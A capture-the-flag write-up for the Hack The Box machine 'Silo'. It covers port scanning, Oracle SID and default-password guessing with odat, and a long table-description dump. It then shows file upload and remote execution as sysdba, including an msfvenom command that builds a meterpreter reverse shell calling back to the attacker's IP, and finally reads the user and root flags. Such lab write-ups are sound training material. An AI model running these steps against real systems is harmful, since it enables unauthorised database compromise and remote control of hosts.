We have the IP of the machine. After some quick enumeration we find out:
```
$  sudo nmap -sS --min-rate 5000 -vvv -n -Pn -p- $(cat ip) -oN  out.nmap
.
.
.

PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
1521/tcp  open  oracle       syn-ack ttl 127
5985/tcp  open  wsman        syn-ack ttl 127
47001/tcp open  winrm        syn-ack ttl 127
49152/tcp open  unknown      syn-ack ttl 127
49153/tcp open  unknown      syn-ack ttl 127
49154/tcp open  unknown      syn-ack ttl 127
49155/tcp open  unknown      syn-ack ttl 127
49159/tcp open  unknown      syn-ack ttl 127
49160/tcp open  unknown      syn-ack ttl 127
49161/tcp open  unknown      syn-ack ttl 127
49162/tcp open  unknown      syn-ack ttl 127

```
It looks like there is an http server, but it offers few places to visit, so lets perform some discovery:

```
$ gobuster dir  -u http://silo.htb/ -w /home/lotape6/resources/hack/SecLists/Discovery/Web-Content/common.txt

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/aspnet_client        (Status: 301) [Size: 153] [--> http://silo.htb/aspnet_client/]
Progress: 4715 / 4716 (99.98%)

```

There is also a SMB server, so we can try some default enumeration without username:

```
smbclient -L //silo.htb -U ""
```
Nothing interesting over there. Back to the ports, we have a more detailed report of the ports and we find another HTTP server:
```
Starting Nmap 7.80 ( https://nmap.org ) at 2024-11-11 13:47 CET
Nmap scan report for silo.htb (10.10.10.82)
Host is up (0.54s latency).

PORT      STATE  SERVICE      VERSION
80/tcp    open   http         Microsoft IIS httpd 8.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: IIS Windows Server
135/tcp   open   msrpc        Microsoft Windows RPC
139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open   microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp  open   oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
5985/tcp  open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
16244/tcp closed unknown
34592/tcp closed unknown
41762/tcp closed unknown
47001/tcp open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open   msrpc        Microsoft Windows RPC
49153/tcp open   msrpc        Microsoft Windows RPC
49154/tcp open   msrpc        Microsoft Windows RPC
49155/tcp open   msrpc        Microsoft Windows RPC
49159/tcp open   oracle-tns   Oracle TNS listener (requires service name)
49160/tcp open   msrpc        Microsoft Windows RPC
49161/tcp open   msrpc        Microsoft Windows RPC
49162/tcp open   msrpc        Microsoft Windows RPC
61781/tcp closed unknown
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode:
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: supported
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2024-11-11T12:49:50
|_  start_date: 2024-11-11T12:44:59

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 141.26 seconds

```

After trying some rpc enum, nothing is shown:
```
$ rpcinfo -p silo.htb
silo.htb: RPC: Remote system error - Connection refused
```

After some search for oracle db in hack tricks, we find this interesting web page: https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener. In there we find the [odat tool](https://github.com/quentinhardy/odat/releases/) 

After downloading all the dependencies and configuring them, we can directly run the script to find vulnerabilities:
```
./odat.py all -s $(cat silo_ip ) -p 1521

'XE' is a valid SID
'XE' is a valid Service Name
'XEXDB' is a valid Service Name
```
After running the script we find out a valid SID: `XE` 
Also, an interesting web page is https://blog.cyberadvisors.com/technical-blog/blog/exploiting-oracle-databases-with-odat where the odat tool is used to exploit an Oracle DB


There was another method to brute force the SID with nmap:
```
nmap -p 1521 -v --script oracle-sid-brute 10.10.10.82

nmap -p 1521 -v --script oracle-brute --script-args oracle-brute.sid=XE 10.10.10.82
```

Nothing found with nmap, but found with odat
```
./odat.py passwordguesser -s silo.htb -p 1521 -d XE

[+] Valid credentials found: scott/tiger. Continue... 
```
Once we have the password, we can try to enumerate all the tables available
```
./odat.py search -s 10.10.10.82 -d XE -U scott -P tiger --desc-tables

[1] (10.10.10.82:1521): Descibe each table which is accessible by the current user (without system tables)
100% |############################################################################################################################################################################################| Time: 00:00:33

[+] MDSYS.SDO_XML_SCHEMAS (1/47)
column_name   data_type
=======================
ID            NUMBER
DESCRIPTION   VARCHAR2
XMLSCHEMA     CLOB

[+] MDSYS.SDO_TOPO_RELATION_DATA (2/47)
 column_name     data_type
==========================
TG_LAYER_ID      NUMBER
TG_ID            NUMBER
TOPO_ID          NUMBER
TOPO_TYPE        NUMBER
TOPO_ATTRIBUTE   VARCHAR2

[+] CTXSYS.DR$THS (3/47)
column_name   data_type
=======================
THS_ID        NUMBER
THS_NAME      VARCHAR2
THS_OWNER#    NUMBER
THS_CASE      VARCHAR2

[+] MDSYS.SRSNAMESPACE_TABLE (4/47)
column_name    data_type
========================
SRSNAMESPACE   VARCHAR2
SRSNAME        VARCHAR2
SDO_SRID       NUMBER

[+] MDSYS.OGIS_SPATIAL_REFERENCE_SYSTEMS (5/47)
column_name   data_type
=======================
SRID          NUMBER
AUTH_NAME     VARCHAR2
AUTH_SRID     NUMBER
SRTEXT        VARCHAR2
SRNUM         NUMBER

[+] MDSYS.SDO_UNITS_OF_MEASURE (6/47)
   column_name       data_type
==============================
UOM_ID               NUMBER
UNIT_OF_MEAS_NAME    VARCHAR2
SHORT_NAME           VARCHAR2
LEGACY_UNIT_NAME     VARCHAR2
UNIT_OF_MEAS_TYPE    VARCHAR2
TARGET_UOM_ID        NUMBER
FACTOR_B             NUMBER
FACTOR_C             NUMBER
INFORMATION_SOURCE   VARCHAR2
DATA_SOURCE          VARCHAR2
IS_LEGACY            VARCHAR2
LEGACY_CODE          NUMBER

[+] MDSYS.SDO_COORD_OP_PARAMS (7/47)
   column_name       data_type
==============================
PARAMETER_ID         NUMBER
PARAMETER_NAME       VARCHAR2
INFORMATION_SOURCE   VARCHAR2
DATA_SOURCE          VARCHAR2
UNIT_OF_MEAS_TYPE    VARCHAR2

[+] APEX_040000.WWV_FLOW_DUAL100 (8/47)
column_name   data_type
=======================
I             NUMBER

[+] MDSYS.SDO_TXN_IDX_INSERTS (9/47)
 column_name     data_type
==========================
SDO_TXN_IDX_ID   VARCHAR2
RID              VARCHAR2
START_1          NUMBER
END_1            NUMBER
START_2          NUMBER
END_2            NUMBER
START_3          NUMBER
END_3            NUMBER
START_4          NUMBER
END_4            NUMBER

[+] CTXSYS.DR$POLICY_TAB (10/47)
column_name   data_type
=======================
PLT_POLICY    CHAR
PLT_LANGCOL   CHAR

[+] MDSYS.SDO_CS_SRS (11/47)
column_name    data_type
==========================
CS_NAME       VARCHAR2
SRID          NUMBER
AUTH_SRID     NUMBER
AUTH_NAME     VARCHAR2
WKTEXT        VARCHAR2
CS_BOUNDS     SDO_GEOMETRY
WKTEXT3D      VARCHAR2

[+] MDSYS.SDO_PROJECTIONS_OLD_SNAPSHOT (12/47)
column_name   data_type
=======================
NAME          VARCHAR2

[+] MDSYS.SDO_PRIME_MERIDIANS (13/47)
    column_name       data_type
===============================
PRIME_MERIDIAN_ID     NUMBER
PRIME_MERIDIAN_NAME   VARCHAR2
GREENWICH_LONGITUDE   FLOAT
UOM_ID                NUMBER
INFORMATION_SOURCE    VARCHAR2
DATA_SOURCE           VARCHAR2

[+] MDSYS.SDO_DATUMS (14/47)
   column_name       data_type
==============================
DATUM_ID             NUMBER
DATUM_NAME           VARCHAR2
DATUM_TYPE           VARCHAR2
ELLIPSOID_ID         NUMBER
PRIME_MERIDIAN_ID    NUMBER
INFORMATION_SOURCE   VARCHAR2
DATA_SOURCE          VARCHAR2
SHIFT_X              NUMBER
SHIFT_Y              NUMBER
SHIFT_Z              NUMBER
ROTATE_X             NUMBER
ROTATE_Y             NUMBER
ROTATE_Z             NUMBER
SCALE_ADJUST         NUMBER
IS_LEGACY            VARCHAR2
LEGACY_CODE          NUMBER

[+] MDSYS.SDO_COORD_AXIS_NAMES (15/47)
   column_name       data_type
==============================
COORD_AXIS_NAME_ID   NUMBER
COORD_AXIS_NAME      VARCHAR2

[+] MDSYS.SDO_COORD_OP_METHODS (16/47)
     column_name         data_type
==================================
COORD_OP_METHOD_ID       NUMBER
COORD_OP_METHOD_NAME     VARCHAR2
LEGACY_NAME              VARCHAR2
REVERSE_OP               NUMBER
INFORMATION_SOURCE       VARCHAR2
DATA_SOURCE              VARCHAR2
IS_IMPLEMENTED_FORWARD   NUMBER
IS_IMPLEMENTED_REVERSE   NUMBER

[+] MDSYS.SDO_COORD_OP_PARAM_USE (17/47)
    column_name       data_type
===============================
COORD_OP_METHOD_ID    NUMBER
PARAMETER_ID          NUMBER
LEGACY_PARAM_NAME     VARCHAR2
SORT_ORDER            NUMBER
PARAM_SIGN_REVERSAL   VARCHAR2

[+] MDSYS.NTV2_XML_DATA (18/47)
  column_name     data_type
===========================
NTV2_FILE_ID      NUMBER
SEQUENCE_NUMBER   NUMBER
XML               XMLTYPE

[+] MDSYS.SDO_TXN_IDX_DELETES (19/47)
 column_name     data_type
==========================
END_1            NUMBER
START_2          NUMBER
END_2            NUMBER
START_3          NUMBER
END_3            NUMBER
START_4          NUMBER
END_4            NUMBER
SDO_TXN_IDX_ID   VARCHAR2
RID              VARCHAR2
START_1          NUMBER

[+] CTXSYS.DR$OBJECT_ATTRIBUTE (20/47)
column_name    data_type
========================
OAT_ID         NUMBER
OAT_CLA_ID     NUMBER
OAT_OBJ_ID     NUMBER
OAT_ATT_ID     NUMBER
OAT_NAME       VARCHAR2
OAT_DESC       VARCHAR2
OAT_REQUIRED   CHAR
OAT_SYSTEM     CHAR
OAT_STATIC     CHAR
OAT_DATATYPE   CHAR
OAT_DEFAULT    VARCHAR2
OAT_VAL_MIN    NUMBER
OAT_VAL_MAX    NUMBER
OAT_LOV        CHAR

[+] CTXSYS.DR$THS_PHRASE (21/47)
column_name   data_type
=======================
THP_ID        NUMBER
THP_THSID     NUMBER
THP_PHRASE    VARCHAR2
THP_QUALIFY   VARCHAR2
THP_NOTE      VARCHAR2
THP_RINGID    NUMBER

[+] MDSYS.SDO_ELLIPSOIDS (22/47)
   column_name       data_type
==============================
ELLIPSOID_ID         NUMBER
ELLIPSOID_NAME       VARCHAR2
SEMI_MAJOR_AXIS      NUMBER
UOM_ID               NUMBER
INV_FLATTENING       NUMBER
SEMI_MINOR_AXIS      NUMBER
INFORMATION_SOURCE   VARCHAR2
DATA_SOURCE          VARCHAR2
IS_LEGACY            VARCHAR2
LEGACY_CODE          NUMBER

[+] SCOTT.BONUS (23/47)
column_name   data_type
=======================
ENAME         VARCHAR2
JOB           VARCHAR2
SAL           NUMBER
COMM          NUMBER

[+] SCOTT.SALGRADE (24/47)
column_name   data_type
=======================
GRADE         NUMBER
LOSAL         NUMBER
HISAL         NUMBER

[+] MDSYS.SDO_TOPO_TRANSACT_DATA (25/47)
 column_name    data_type
=========================
TOPO_SEQUENCE   NUMBER
TOPOLOGY_ID     VARCHAR2
TOPO_ID         NUMBER
TOPO_TYPE       NUMBER
TOPO_OP         VARCHAR2
PARENT_ID       NUMBER

[+] APEX_040000.WWV_FLOW_TEMP_TABLE (26/47)
column_name   data_type
=======================
C059          VARCHAR2
C060          VARCHAR2
C061          VARCHAR2
C062          VARCHAR2
C063          VARCHAR2
C064          VARCHAR2
C065          VARCHAR2
R             NUMBER
C001          VARCHAR2
C002          VARCHAR2
C003          VARCHAR2
C004          VARCHAR2
C005          VARCHAR2
C006          VARCHAR2
C007          VARCHAR2
C008          VARCHAR2
C009          VARCHAR2
C010          VARCHAR2
C011          VARCHAR2
C012          VARCHAR2
C013          VARCHAR2
C014          VARCHAR2
C015          VARCHAR2
C016          VARCHAR2
C017          VARCHAR2
C018          VARCHAR2
C019          VARCHAR2
C020          VARCHAR2
C021          VARCHAR2
C022          VARCHAR2
C023          VARCHAR2
C024          VARCHAR2
C025          VARCHAR2
C026          VARCHAR2
C027          VARCHAR2
C028          VARCHAR2
C029          VARCHAR2
C030          VARCHAR2
C031          VARCHAR2
C032          VARCHAR2
C033          VARCHAR2
C034          VARCHAR2
C035          VARCHAR2
C036          VARCHAR2
C037          VARCHAR2
C038          VARCHAR2
C039          VARCHAR2
C040          VARCHAR2
C041          VARCHAR2
C042          VARCHAR2
C043          VARCHAR2
C044          VARCHAR2
C045          VARCHAR2
C046          VARCHAR2
C047          VARCHAR2
C048          VARCHAR2
C049          VARCHAR2
C050          VARCHAR2
C051          VARCHAR2
C052          VARCHAR2
C053          VARCHAR2
C054          VARCHAR2
C055          VARCHAR2
C056          VARCHAR2
C057          VARCHAR2
C058          VARCHAR2

[+] MDSYS.OGIS_GEOMETRY_COLUMNS (27/47)
   column_name      data_type
=============================
F_TABLE_SCHEMA      VARCHAR2
F_TABLE_NAME        VARCHAR2
F_GEOMETRY_COLUMN   VARCHAR2
G_TABLE_SCHEMA      VARCHAR2
G_TABLE_NAME        VARCHAR2
STORAGE_TYPE        NUMBER
GEOMETRY_TYPE       NUMBER
COORD_DIMENSION     NUMBER
MAX_PPR             NUMBER
SRID                NUMBER

[+] MDSYS.SDO_COORD_AXES (28/47)
      column_name         data_type
===================================
COORD_SYS_ID              NUMBER
COORD_AXIS_NAME_ID        NUMBER
COORD_AXIS_ORIENTATION    VARCHAR2
COORD_AXIS_ABBREVIATION   VARCHAR2
UOM_ID                    NUMBER
ORDER                     NUMBER

[+] MDSYS.SDO_COORD_REF_SYS (29/47)
     column_name         data_type
====================================
SRID                    NUMBER
COORD_REF_SYS_NAME      VARCHAR2
COORD_REF_SYS_KIND      VARCHAR2
COORD_SYS_ID            NUMBER
DATUM_ID                NUMBER
GEOG_CRS_DATUM_ID       NUMBER
SOURCE_GEOG_SRID        NUMBER
PROJECTION_CONV_ID      NUMBER
CMPD_HORIZ_SRID         NUMBER
CMPD_VERT_SRID          NUMBER
INFORMATION_SOURCE      VARCHAR2
DATA_SOURCE             VARCHAR2
IS_LEGACY               VARCHAR2
LEGACY_CODE             NUMBER
LEGACY_WKTEXT           VARCHAR2
LEGACY_CS_BOUNDS        SDO_GEOMETRY
IS_VALID                VARCHAR2
SUPPORTS_SDO_GEOMETRY   VARCHAR2

[+] MDSYS.SDO_COORD_OPS (30/47)
     column_name         data_type
==================================
COORD_OP_ID              NUMBER
COORD_OP_NAME            VARCHAR2
COORD_OP_TYPE            VARCHAR2
SOURCE_SRID              NUMBER
TARGET_SRID              NUMBER
COORD_TFM_VERSION        VARCHAR2
COORD_OP_VARIANT         NUMBER
COORD_OP_METHOD_ID       NUMBER
UOM_ID_SOURCE_OFFSETS    NUMBER
UOM_ID_TARGET_OFFSETS    NUMBER
INFORMATION_SOURCE       VARCHAR2
DATA_SOURCE              VARCHAR2
SHOW_OPERATION           NUMBER
IS_LEGACY                VARCHAR2
LEGACY_CODE              NUMBER
REVERSE_OP               NUMBER
IS_IMPLEMENTED_FORWARD   NUMBER
IS_IMPLEMENTED_REVERSE   NUMBER

[+] MDSYS.SDO_PREFERRED_OPS_SYSTEM (31/47)
column_name   data_type
=======================
SOURCE_SRID   NUMBER
COORD_OP_ID   NUMBER
TARGET_SRID   NUMBER

[+] MDSYS.SDO_PREFERRED_OPS_USER (32/47)
column_name   data_type
=======================
USE_CASE      VARCHAR2
SOURCE_SRID   NUMBER
COORD_OP_ID   NUMBER
TARGET_SRID   NUMBER

[+] MDSYS.SDO_DATUMS_OLD_SNAPSHOT (33/47)
column_name    data_type
========================
NAME           VARCHAR2
SHIFT_X        NUMBER
SHIFT_Y        NUMBER
SHIFT_Z        NUMBER
ROTATE_X       NUMBER
ROTATE_Y       NUMBER
ROTATE_Z       NUMBER
SCALE_ADJUST   NUMBER

[+] SCOTT.EMP (34/47)
column_name   data_type
=======================
EMPNO         NUMBER
ENAME         VARCHAR2
JOB           VARCHAR2
MGR           NUMBER
HIREDATE      DATE
SAL           NUMBER
COMM          NUMBER
DEPTNO        NUMBER

[+] MDSYS.SDO_ST_TOLERANCE (35/47)
column_name   data_type
=======================
TOLERANCE     NUMBER

[+] APEX_040000.WWV_FLOW_LOV_TEMP (36/47)
column_name    data_type
========================
INSERT_ORDER   NUMBER
DISP           VARCHAR2
VAL            VARCHAR2

[+] MDSYS.SDO_COORD_SYS (37/47)
   column_name       data_type
==============================
COORD_SYS_ID         NUMBER
COORD_SYS_NAME       VARCHAR2
COORD_SYS_TYPE       VARCHAR2
DIMENSION            NUMBER
INFORMATION_SOURCE   VARCHAR2
DATA_SOURCE          VARCHAR2

[+] SCOTT.DEPT (38/47)
column_name   data_type
=======================
DEPTNO        NUMBER
DNAME         VARCHAR2
LOC           VARCHAR2

[+] CTXSYS.DR$NUMBER_SEQUENCE (39/47)
column_name   data_type
=======================
NUM           NUMBER

[+] MDSYS.SDO_COORD_OP_PATHS (40/47)
    column_name       data_type
===============================
CONCAT_OPERATION_ID   NUMBER
SINGLE_OPERATION_ID   NUMBER
SINGLE_OP_SOURCE_ID   NUMBER
SINGLE_OP_TARGET_ID   NUMBER
OP_PATH_STEP          NUMBER

[+] MDSYS.SDO_COORD_OP_PARAM_VALS (41/47)
    column_name        data_type
================================
COORD_OP_ID            NUMBER
COORD_OP_METHOD_ID     NUMBER
PARAMETER_ID           NUMBER
PARAMETER_VALUE        FLOAT
PARAM_VALUE_FILE_REF   VARCHAR2
PARAM_VALUE_FILE       CLOB
PARAM_VALUE_XML        XMLTYPE
UOM_ID                 NUMBER

[+] MDSYS.SDO_CRS_GEOGRAPHIC_PLUS_HEIGHT (42/47)
column_name   data_type
=======================
SRID          NUMBER

[+] MDSYS.SDO_ELLIPSOIDS_OLD_SNAPSHOT (43/47)
   column_name       data_type
==============================
NAME                 VARCHAR2
SEMI_MAJOR_AXIS      NUMBER
INVERSE_FLATTENING   NUMBER

[+] XDB.XDB$XIDX_IMP_T (44/47)
column_name   data_type
=======================
INDEX_NAME    VARCHAR2
SCHEMA_NAME   VARCHAR2
ID            VARCHAR2
DATA          CLOB
GRPPOS        NUMBER

[+] MDSYS.SDO_TXN_IDX_EXP_UPD_RGN (45/47)
 column_name     data_type
==========================
SDO_TXN_IDX_ID   VARCHAR2
RID              VARCHAR2
START_1          NUMBER
END_1            NUMBER
START_2          NUMBER
END_2            NUMBER
START_3          NUMBER
END_3            NUMBER
START_4          NUMBER
END_4            NUMBER

[+] MDSYS.SDO_CS_CONTEXT_INFORMATION (46/47)
column_name   data_type
=======================
FROM_SRID     NUMBER
TO_SRID       NUMBER
CONTEXT       RAW

[+] MDSYS.SDO_TOPO_DATA$ (47/47)
column_name   data_type
=======================
TOPOLOGY      VARCHAR2
TG_LAYER_ID   NUMBER
TG_ID         NUMBER
TOPO_ID       NUMBER
TOPO_TYPE     NUMBER
```

First let's take a look to the --basic-info output:
```
Users: 

XS$NULL
SCOTT
APEX_040000
APEX_PUBLIC_USER
FLOWS_FILES
HR
MDSYS
ANONYMOUS
XDB
CTXSYS
APPQOSSYS
DBSNMP
ORACLE_OCM
DIP
OUTLN
SYSTEM
SYS

```

Before proceeding, let's try some interactive shell with 
```
./odat.py search -s 10.10.10.82 -d XE -U scott -P tiger --sql-shell

```

There is nothing interesting to be done there, so investigating the odat tool it looks like you can upload and execute commands:

```
./odat.py utlfile -s $SERVER -d $SID -U $USER -P $PASSWORD --putFile /tmp/ peas.exe ./htb/tracks/crest_crt/remote/peas.exe

[1] (10.10.10.82:1521): Put the ./htb/tracks/crest_crt/remote/peas.exe local file in the /tmp/ folder like peas.exe on the 10.10.10.82 server
[-] Impossible to put the ./htb/tracks/crest_crt/remote/peas.exe file: `ORA-01031: insufficient privileges`
```
It looks like the error was that I was not passing the --sysdba flag and also I was not passing a Windows like path to store the file:
```
./odat.py utlfile -s $SERVER -d $SID -U $USER -P $PASSWORD --sysdba --putFile c:/ peas.exe ../htb/tracks/crest_crt/remote/peas.exe
```

Then we should create our payload, for example using msfvenom (since I've not found any ps1 able to be run).
```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.16.6 lport=31415 -f exe > writeup.exe

./odat.py utlfile -s $SERVER -d $SID -U $USER -P $PASSWORD --sysdba --putFile c:/ wu.exe writeup.exe

./odat.py externaltable -s $SERVER -d $SID -U $USER -P $PASSWORD --sysdba --exec c:/ wu.exe


DOES NOT WORK, TRYING A NEW MSFVENOM PAYLOAD:
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe

```

Finally, I've created a bat script to list all the users over C:\Users\ (chatgpt): 
```
@echo off REM Navigate to C:\Users cd C:\Users REM List all directories (user folders) and redirect output to out.txt dir /b /ad > out.txt
```
Saved it into a `run.bat` file and uploaded with the `./odat.py utlfile` utility.
After doing so and retrieving the output file we receive the following:
```
./odat.py externaltable -s $SERVER -d $SID -U $USER -P $PASSWORD --getFile 'C:\Users\' out.txt out.txt --sysdba

[1] (10.10.10.82:1521): Read the out.txt file stored in the C:\Users\ path
[+] Data stored in the remote file out.txt stored in C:\Users\
.NET v2.0
.NET v2.0 Classic
.NET v4.5
.NET v4.5 Classic
Administrator
All Users
Classic .NET AppPool
Default
Default User
Phineas
Public
```

Let's assume Phineas is the user.txt holder: 
```
 ./odat.py externaltable -s $SERVER -d $SID -U $USER -P $PASSWORD --getFile 'C:\Users\Phineas\Desktop\' user.txt ../htb/tracks/crest_crt/silo/user.txt --sysdba
 
e9984....
```

```
./odat.py externaltable -s $SERVER -d $SID -U $USER -P $PASSWORD --getFile 'C:\Users\Administrator\Desktop\' root.txt ../htb/tracks/crest_crt/silo/user.txt --sysdba

9f7c3...
```